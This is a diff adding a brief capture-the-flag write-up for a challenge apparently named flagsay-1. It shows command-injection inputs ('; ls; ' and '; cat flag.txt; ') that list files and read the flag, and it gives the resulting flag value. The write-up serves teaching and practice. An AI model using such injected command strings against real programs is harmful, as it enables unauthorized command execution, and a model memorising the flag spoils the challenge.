@@ -1,0 +1,16 @@
+The program runs the command.
+You can inject command by typing for example:
+"; ls; " (" is not for qouting but real char)
+
+That will give you:
+
+flagsay-1
+flagsay-1_no_aslr
+flag.txt
+xinetd_wrapper.sh
+sh: 16
+
+Then run the program again with:
+"; cat flag.txt; "
+
+The result is: 0631e788cab2c2de59a5419b6c90c55c
